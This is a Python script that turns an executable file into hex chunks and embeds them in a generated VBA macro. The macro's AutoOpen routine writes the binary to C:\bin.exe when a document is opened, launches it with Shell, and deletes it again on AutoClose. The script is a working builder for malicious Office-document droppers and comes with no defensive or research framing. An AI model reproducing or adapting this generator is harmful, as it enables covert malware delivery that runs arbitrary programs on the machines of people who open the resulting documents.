from binascii import hexlify, unhexlify


def file2hex_array(input_file, output_file):
    with open(input_file, "rb") as fd_in, open(output_file, "wb") as fd_out:
        fd_out.write(b"\n")
        i = 1
        while chunk := fd_in.read(20):
            # _string = f'''Films({i}) = "'''
            _string = f'''Films({i}) = "'''
            fd_out.write(bytes(_string, 'utf-8'))
            fd_out.write(hexlify(chunk))
            fd_out.write(b'"')
            fd_out.write(b"\n")
            i = i + 1
        fd_out.write(b"]")


def file2hex(input_file, output_file):
    file_head = f'''
Sub AutoOpen()
    Dim fileName As String
    fileName = "C:\\bin.exe"
    Dim coll As Object
    Set coll = CreateObject("System.Collections.ArrayList")
'''
    end_of_file = f'''
    Dim toFile
    Dim MyChar
    Open fileName For Output As #1
        For Each elem In coll
            arr = Split(elem, "|")
            For Each hexStr In arr
               toFile = toFile + HexToString(CStr(hexStr))
            Next
        Next
        Print #1, toFile
    Close #1
    Call Shell(fileName, vbNormalFocus)
End Sub

Sub DeleteFile(ByVal FileToDelete As String)
   If (Dir(FileToDelete) <> "") Then
      SetAttr FileToDelete, vbNormal
      Kill FileToDelete
   End If
End Sub


Private Function HexToString(Value As String)
    Dim szTemp As String
    szTemp = Value

    Dim szData As String
    szData = ""
    While Len(szTemp) > 0
        szData = Chr(CLng("&h" & Right(szTemp, 2))) & szData
        If (Len(szTemp) = 1) Then
            szTemp = Left(szTemp, Len(szTemp) - 1)
        Else
            szTemp = Left(szTemp, Len(szTemp) - 2)
        End If
    Wend
    HexToString = szData
End Function

Sub AutoClose()
    DeleteFile ("C:\\bin.exe")
End Sub
'''
    with open(input_file, "rb") as fd_in, open(output_file, "w") as fd_out:
        fd_out.write(file_head)
        while chunk := fd_in.read(100):
            split_strings = [hexlify(chunk)[i:i + 2] for i in range(0, len(hexlify(chunk)), 2)]
            fd_out.write('\t\tcoll.Add ')
            _string = f'''"'''
            for hex_var in split_strings:
                # _string = _string + hex_var
                _string = _string + str(hex_var)[2:][:-1] + '|'
                # _string = _string + hex_var
                # fd_out.write(hex_var)
                # fd_out.write(b",'")
            print(_string)
            fd_out.write(_string[:-1])
            fd_out.write(f'"\n')
        fd_out.write(end_of_file)


def hex2file(input_file, output_file):
    with open(input_file, "rb") as fd_in, open(output_file, "wb") as fd_out:
        for line in fd_in:
            fd_out.write(unhexlify(line.rstrip()))


def string2file(hex_str, output_file):
    # print(hex_str)
    with open(output_file, "wb") as fd_out:
        for line in hex_str:
            print(line)
            print(line.rstrip())
            print(unhexlify(line.rstrip()))
            i = 1
            fd_out.write(unhexlify(line.rstrip()))


if __name__ == '__main__':
    #   file2hex_array(f"""exe\\test.exe""", f"""hex\\new.hex""")
    #   string2file(hex_string, f"""exe\\new_2.0.exe""")
    file2hex(f"""exe\\test.exe""", f"""hex\\test.hex""")
    #   hex2file(f"""hex\\test.hex""", f"""exe\\new.exe""")
    #   hex2file(f"""hex\\test.hex""", f"""exe\\new.exe""")
    #   hex2file(hex_string, f"""exe\\new_v2.exe""")
